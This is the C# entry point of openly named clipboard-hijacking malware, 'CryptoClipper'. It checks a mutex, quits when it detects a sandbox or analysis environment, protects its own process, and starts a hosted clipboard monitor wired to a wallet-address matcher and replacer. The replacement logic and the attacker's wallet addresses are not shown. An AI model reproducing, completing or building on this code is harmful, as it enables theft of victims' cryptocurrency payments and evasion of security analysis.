using CryptoClipper.Config;
using CryptoClipper.Core;
using CryptoClipper.Stealth;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;

namespace CryptoClipper;

internal static class Program
{
    public static async Task Main(string[] args)
    {
        if (!MutexCheck.TryAcquire())
            return;

        if (AntiSandbox.IsAnalysisEnvironment())
            return;

        ProcessProtection.ProtectCurrentProcess();

        var host = Host.CreateDefaultBuilder(args)
            .ConfigureServices((context, services) =>
            {
                services.AddSingleton<ClipperConfig>();
                services.AddSingleton<WalletAddresses>();
                services.AddSingleton<WalletMatcher>();
                services.AddSingleton<AddressReplacer>();
                services.AddSingleton<ClipboardMonitor>();
                services.AddHostedService<ClipboardMonitor>(sp => sp.GetRequiredService<ClipboardMonitor>());
            })
            .Build();

        await host.RunAsync();
    }
}
